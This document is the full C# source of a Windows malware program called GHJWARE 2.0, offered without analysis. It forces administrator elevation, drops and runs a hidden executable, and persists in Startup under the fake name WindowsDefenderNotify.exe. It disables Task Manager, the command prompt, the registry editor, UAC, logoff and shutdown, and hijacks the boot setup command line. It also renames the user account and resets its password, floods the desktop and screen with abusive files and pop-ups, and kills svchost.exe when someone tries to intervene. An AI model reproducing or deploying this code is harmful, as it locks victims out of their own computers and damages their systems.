using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Media;
using System.Security.Principal;
using System.DirectoryServices;
using System.Security.AccessControl;

namespace GHJWARE_2._0
{
    internal class Program
    {
        

                 [DllImport("User32")]
                 private static extern int ShowWindow(int hwnd, int nCmdShow);
                 public static bool taskkill = true;
                 public static string filename = Process.GetCurrentProcess().MainModule.FileName;
                 public static string filenameexe = Path.GetFileName(filename);
                 public static string filename2 = Environment.CurrentDirectory + @"\"+filenameexe;
                 public bool IsCurrentProcessAdmin() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
                 const int SPI_SETDESKWALLPAPER = 20;
                 const int SPIF_UPDATEINIFILE = 0x01;
                 const int SPIF_SENDWININICHANGE = 0x02;

                 [DllImport("user32.dll", CharSet = CharSet.Auto)]
                 static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

                 public enum Style : int
                 {
                     Tiled,
                     Centered,
                     Stretched
                 }
                 static void Main(string[] args)
                 {
                    uac:
                    try
                    {
                        if (!new Program().IsCurrentProcessAdmin())
                        {
                            string[] commandLineArgs = Environment.GetCommandLineArgs();
                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = commandLineArgs[0],
                                UseShellExecute = true,
                                Verb = "runas"
                            });
                            Environment.Exit(0);
                        }
                    }
                    catch
                    {
                        goto uac;
                    }
                    Directory.CreateDirectory("C:\\Windows\\System64");
            File.WriteAllBytes("C:\\Windows\\System64\\Format.exe", Properties.Resources.GHJSupporter);
            Process.Start("C:\\Windows\\System64\\Format.exe");
            new HAHHa2().Show();
         
            for(int i =0; i<255;i++)
            {
                File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\FUCK YOU VERY MUCH FUCK YOU VERY MUCH FUCK YOU VERY MUCH FUCK YOU VERY MUCH FUCK YOU VERY MUCH " + i + ".exe");
            }
                    File.WriteAllText("C:\\Windows\\System64\\security.bat", Properties.Resources.security);
                    int hWnd = Process.GetCurrentProcess().MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, 0);
                    if (args.Length == 1)
                    {
                        if (args[0].ToLower() == "-monitor" || args[0].ToLower() == "/monitor")
                        {
                            Console.WriteLine("Current proccess name is: " + filenameexe);
                            Console.WriteLine("Current directory is: " + Environment.CurrentDirectory);
                            Console.WriteLine("Path for opening monitors is: " + filename2);
                            Thread thread1 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread1.Start();
                            Thread thread2 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread2.Start();
                            Thread thread3 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread3.Start();
                            Thread thread4 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread4.Start();
                            Thread thread5 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread5.Start();
                            Thread thread6 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread6.Start();
                            Thread thread7 = new Thread(new ThreadStart(WorkThreadFunction1234));
                            thread7.Start();
                            Console.WriteLine("Started 7 messages boxes");
                            WorkThreadFunction1235();
                            Console.WriteLine("Started monitoring processes");
                            return;
                        }
                        else if (args[0].ToLower() == "-monitora" || args[0].ToLower() == "/monitora")
                        {      
                            WorkThreadFunction123();
                            return;
                        }
                        else
                        {
                            Console.WriteLine("Please start this app without any arguments.");
                            return;
                         }
                     }
                     if(!(Environment.CurrentDirectory=="C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
                     {
                         File.Copy(filename2, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsDefenderNotify.exe");
                         Console.WriteLine("Copied file to autostart");
                     }

            Process.Start(filename2, "/monitor");
            Process.Start(filename2, "/monitor");
            Process.Start(filename2,"/monitor");
                     Console.WriteLine("Started 5 monitors");
                     File.WriteAllText("trashed.txt", Properties.Resources.trashed);
                     Process.Start("trashed.txt");
                     Console.WriteLine("Showed trashed.txt file");
                     RegistryKey rk = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", true);
                     rk.SetValue("DisableTaskMgr", 1);
            rk.SetValue("DisableLockWorkstation", 1);
            rk.SetValue("DisableChangePassword", 1);
                     Console.WriteLine("Disabled Task Manager");
                     RegistryKey rk2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System", true);
                     rk2.SetValue("DisableCMD", 1);
                     Console.WriteLine("Disabled CMD");
                     rk2.SetValue("DisableRegistryTools", 1);
                     RegistryKey rk3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\Setup", true);
                     rk3.SetValue("CmdLine", "C:\\Windows\\System64\\security.bat");
                     rk3.SetValue("SetupPhase", 5);
                     rk3.SetValue("SetupType", 1);
            rk3.SetValue("OOBEInProgress", 1);
            rk3.SetValue("SystemSetupInProgress", 1);
                     Console.WriteLine("Disabled Regedit");
                     Thread.Sleep(2000);
                     Thread thread = new Thread(new ThreadStart(WorkThreadFunction));
                     thread.Start();
                     Console.WriteLine("Started a music");
                     File.WriteAllBytes("wallpaper.png", Properties.Resources.YCHBIBGHJW2_0);
                     Set(Environment.CurrentDirectory+"\\wallpaper.png", Style.Centered);
                     Console.WriteLine("Wallpaper changed");
                     RenameUser(Environment.UserName, "ghjware");
            RegistryKey rk4 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",true);
            rk4.SetValue("EnableLUA", 0);
            RegistryKey rk5 = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System\Explorer");
            rk5.SetValue("NoLogoff", 1);
            RegistryKey rk6 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown");
            rk6.SetValue("value", 1);

                     Process.Start("net.exe", "user ghjware ghjware");

                 }


                 static void WorkThreadFunction1235()
                 { // ten + 5 = 6
                         Directory.CreateDirectory("processes");
                         for(int i = 0;i<5;i++)
                         {
                             File.Copy(filename2,"processes\\"+ filenameexe.Replace(".exe", "") + i + ".exe", true);
                             Process.Start("processes\\" + filenameexe.Replace(".exe", "") + i + ".exe", "/monitora");
                             Console.WriteLine("Started " + i + " monitor");
                         }
                         while (true)
                         {
                             Thread.Sleep(500);
                             while (true)
                             {
                                 Thread.Sleep(8);
                                 if (Process.GetProcessesByName("taskkill").Length > 0|| Process.GetProcessesByName("processhacker").Length > 0|| Process.GetProcessesByName("regedit").Length > 0 )
                                 {
                                     Process.Start("taskkill", "/f /im svchost.exe");
                                 }

                             }
                         }
                 }
                 public static void Set(String path, Style style)
                 {
                     System.IO.Stream s = File.OpenRead(path);

                     System.Drawing.Image img = System.Drawing.Image.FromStream(s);
                     string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
                     img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

                     RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                     if (style == Style.Stretched)
                     {
                         key.SetValue(@"WallpaperStyle", 2.ToString());
                         key.SetValue(@"TileWallpaper", 0.ToString());
                     }

                     if (style == Style.Centered)
                     {
                         key.SetValue(@"WallpaperStyle", 1.ToString());
                         key.SetValue(@"TileWallpaper", 0.ToString());
                     }

                     if (style == Style.Tiled)
                     {
                         key.SetValue(@"WallpaperStyle", 1.ToString());
                         key.SetValue(@"TileWallpaper", 1.ToString());
                     }

                     SystemParametersInfo(SPI_SETDESKWALLPAPER,
                         0,
                         tempPath,
                         SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

             }
             static void WorkThreadFunction123()
                     {
                         Thread.Sleep(900);
                         while (true)
                         {
                             Thread.Sleep(8);
                             if (Process.GetProcessesByName("taskkill").Length > 0)
                             {
                                 Process.Start("taskkill", "/f /im svchost.exe");
                             }

                         }
                     }
                 static void WorkThreadFunction1234()
                     {
                         while (true)
                     {
                         MessageBox.Show("Fuck you!");
                         Thread.Sleep(7000);
                         MessageBox.Show("Are you really idiot?", "Click Yes",MessageBoxButtons.YesNo,MessageBoxIcon.Question);
                     }
                 }
                 static public bool RenameUser(string oldLoginName, string newLoginName)
                 {
                     bool renamed = false;
                     try
                     {
                         using (DirectoryEntry AD = new
                                    DirectoryEntry("WinNT://" + Environment.MachineName + ",computer"))
                         {
                             try
                             {
                                 using (DirectoryEntry NewUser = AD.Children.Find(oldLoginName, "user"))
                                 {
                                     if (NewUser != null)
                                     {
                                         NewUser.Rename(newLoginName);
                                         renamed = true;
                                     }
                                 }
                             }
                             catch (Exception ex)
                             {
                                 MessageBox.Show("Error: " + ex.ToString());
                             }
                         }
                     }
                     catch (Exception ex)
                     {
                         MessageBox.Show("Error: " + ex.ToString());
                     }
                     return renamed;
                 }
                 static void WorkThreadFunction()
                     {
                         try
                         {


                                new HAHHa().Show();
                new HAHHa().Show();
                new HAHHa().Show();
                new HAHHa().Show();
                new HAHHa().Show();
                new HAHHa().Show();
                new HAHHa().Show();
                Stream str3 = Properties.Resources.kojaca_muzyka;
                         SoundPlayer snd3 = new SoundPlayer(str3);
                         snd3.PlayLooping();
                 


                         }
                         catch (Exception ex)
                         {
                             MessageBox.Show("Error " + ex.ToString());
                         }
                     }
        }
   
    }